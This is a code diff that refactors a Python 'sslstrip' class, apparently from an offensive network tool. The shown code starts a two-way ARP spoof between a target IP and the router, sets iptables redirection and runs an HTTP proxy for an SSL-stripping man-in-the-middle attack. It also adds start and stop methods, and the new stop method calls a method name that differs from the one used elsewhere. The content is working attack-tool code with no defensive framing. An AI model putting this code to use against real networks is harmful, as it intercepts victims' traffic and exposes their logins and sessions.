@@ -12,9 +12,7 @@ import string
 import time
 
 class sslstrip:
-    def __init__(self, target_ip, interface):
-        self.target_ip = target_ip
-        self.interface = interface
+    def __init__(self):
         self.redirect_port = 8080
         
     def set_iptables(self, toRunning):
@@ -267,14 +265,16 @@ class sslstrip:
             print("Could not start proxy: %s" % e)
             self.stop_http_proxy()
                 
-    def strip(self):
+    def start(self, target_ip, interface):
         try: 
+            self.target_ip = target_ip
+            self.interface = interface
             # Get router ip and start the arp spoof 
             conf.route.resync()
             router_ip = conf.route.route("0.0.0.0")[2]
-            arp1 = arp()
-            thread = threading.Thread(target=arp1.two_way_arp_spoof, args=(self.target_ip, router_ip, 2, self.interface))
-            thread.start()
+            self.arp1 = arp()
+            self.thread = threading.Thread(target=self.arp1.two_way_arp_spoof, args=(self.target_ip, router_ip, 2, self.interface))
+            self.thread.start()
             
             self.set_iptables(True)
             self.start_http_proxy()
@@ -284,13 +284,21 @@ class sslstrip:
             if self.http_server:
                 self.http_server.shutdown()
             self.set_iptables(False)
-            arp1.stop_spoof()
-            thread.join()
+            self.arp1.stop_spoof()
+            self.thread.join()
         except Exception as e:
             print("An error occured")
             traceback.print_exc()
             self.set_iptables(False)
-            
+    
+    def stop(self):
+        print("Stopping ssl stripping attack")
+        if self.http_server:
+            self.http_server.shutdown()
+        self.set_iptables(False)
+        self.arp1.stop()
+        self.thread.join()
+        
         
                     
                 
